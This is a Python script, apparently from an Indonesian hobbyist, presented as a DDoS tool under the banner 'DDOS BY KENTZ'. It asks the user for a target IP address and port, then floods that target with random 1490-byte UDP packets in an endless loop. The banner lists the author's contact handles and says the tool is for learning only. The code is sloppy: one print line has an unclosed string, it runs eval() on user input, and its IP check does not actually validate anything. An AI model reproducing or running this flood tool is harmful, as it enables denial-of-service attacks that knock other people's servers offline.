#Lets import modules
import sys
import os
import time
import socket
import scapy.all as scapy
import random
import threading
from django.core.validators import URLValidator
from django.core.exceptions import ValidationError

validate = URLValidator()

#Lets start coding
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

#Lets define sock and bytes
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
os.system("clear")
#Banner :
print('''
    ╔─═─═⊱ *「 DDOS BY KENTZ 」* ─═─═⬣
║┏⊱
║  _      __    _____    __      _     
║ |  |   /   /  |   ____|  |   |    |  |  
║|  |_/  /    |   |____  |   |\   |  |
║|   _   |    |    ____| |   |  \  |  |
║|  |  \   \   |   |____  |   |   \|  |
║|_|    \ _\  |_____|  | _ |    \_|
║
║ |>Whatsapp : 6282181113725
║ |>Facebook : Enzeet Enx
║ |>YT : https://youtube.com/@wandexdade
║ °`°`°` Pemberitahuan °`°`°
║
║  1 . Tidak Untuk Balas Dendam Pribadi
║  2 . Creator Pembuatan Script Tidak Bertanggung Jawab Atas Perbuatan Anda
║  3 . Gunakan Dengan Tujuan Pembelajaran
║  4 . Apakah Sc Kentz Pantas Untuk Tindakan Kejahatan? Tidak Sama Sekali
║  5 . Gunakan Sebaik Mungkin
║┗⊱
┗━━━━━━━━━━━━━━━━━━⬣
	''')
#Type your ip and port number (find IP address using nslookup or any online website) 
ip = input(" [+] MASUKAN IP TARGET : ")
port = eval(input(" [+] MASUKAN PORT : "))
os.system("clear")
print('''
    ╔─═─═⊱ *「 DDOS BY KENTZ 」* ─═─═⬣
║┏⊱
║  _      __    _____    __      _     
║ |  |   /   /  |   ____|  |   |    |  |  
║|  |_/  /    |   |____  |   |\   |  |
║|   _   |    |    ____| |   |  \  |  |
║|  |  \   \   |   |____  |   |   \|  |
║|_|    \ _\  |_____|  | _ |    \_|
║┗⊱
┗━━━━━━━━━━━━━━━━━━⬣
	''')
try:
	validate = ip
	print(" ✅ IP Tervalidasi.... ")
	print(" [+] DDOS Attack Loading ....")
except ValidationError as exception :
	print(" ✘ Masukkan ip yang benar.")

#Lets start our attack
print(" ")
print("    Hehe Kang Dedeos:D ")
print(" " )
print(" [+] Om Kentz Lagi Proses Attack Server + Ip )
print (" " )
time.sleep(5)
sent = 0
try :
 while True:
		sock.sendto(bytes, (ip, port))
		sent = sent + 1
		print("\n [+] Berhasil Mengirim %s Paket tKe %s Melalui Port:%s"%(sent,ip,port))
		if port == 65534:
			port = 1
except KeyboardInterrupt:
	print(" ")
	print("\n [-] CTRL + C Detected... Byee")
	print(" [-] DDOS Attack Berhenti")
input(" Enter Untuk Keluar")
os.system("clear")
print(" [-] ©Kentz")
